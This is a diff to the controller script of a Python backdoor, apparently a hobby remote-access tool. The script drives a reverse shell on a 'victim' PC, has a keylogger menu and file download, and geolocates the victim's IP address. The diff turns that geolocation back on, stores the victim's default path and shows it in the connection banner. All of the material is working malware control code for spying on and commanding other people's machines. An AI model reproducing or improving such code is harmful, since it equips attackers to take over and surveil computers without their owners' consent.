@@ -122,14 +122,13 @@ def KeyLogger(): #Keylogger menu -  If chosen, display the Keylogger menu and cr
         exitKeyLogger = selection("keylogger",input(">"))
 def reverseShell(screenThatbeachAcces, keyLogger): #If chosen, open a shell that interact with victim's pc.cat
     global defaultPath
-    encrypter.send_message_server("getpath")
+    """encrypter.send_message_server("getpath")
     client_path = encrypter.receive_message_server()
     if defaultPath is None :
-        defaultPath = client_path
-    else:
-        encrypter.send_message_server("cd "+ defaultPath)
-        encrypter.receive_message_server()
-        client_path = defaultPath
+        defaultPath = client_path"""
+    encrypter.send_message_server("cd "+ defaultPath)
+    encrypter.receive_message_server()
+    client_path = defaultPath
     while True:
         command = input(client_path+ " > ")
         if((command == "stb") & (screenThatbeachAcces == False)) :
@@ -202,8 +201,10 @@ def downloadFile(fileName : str):
         print("Problem in definition.")
         consoleCleaner(True)
 def parser(tupleArray : tuple):
+    global defaultPath
     tupleArray = tupleArray.split("\n")
     useless, arg = tupleArray[3].split(" : ")
+    useless, defaultPath = tupleArray[4].split(" : ")
     return arg
     
         
@@ -213,8 +214,7 @@ encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
 #Calling the function to create the TCP server with specified PORT & HOST.
 client_ip = encrypter.initialize_tcp_connexion_server(HOST,PORT)
 #victimLocalisation = GetLocalisation(client_ip)
-#victimLocalisation = geolocalisation.GeoLocalisation(client_ip).locate()
-victimLocalisation = "unknown"
+victimLocalisation = geolocalisation.GeoLocalisation(client_ip).locate()
 consoleCleaner(False)
 #Getting victim's os infos.
 OsVictimInfos = encrypter.receive_message_server()
@@ -227,14 +227,12 @@ if OsVictimInfos == "exit":
     exitBackDoorLoop = False
 
 #Show the banner.
-#if exitBackDoorLoop :
-#    welcomme()
 #Starting the main loop and waiting for exitBackDoorLoop to change to False.
 while exitBackDoorLoop :
     welcomme()
     print("[*] " + user + " connected from " + client_ip + "\n")
     print("[*] Localisation : "+ victimLocalisation +"\n")
-#    print("[*] Default path : "+ defaultPath +"\n")
+    print("[*] Default path : "+ defaultPath +"\n")
     menu("principale")
     exitBackDoorLoop = selection("principale",input(">"))
 encrypter.close_tcp_connexion_server()
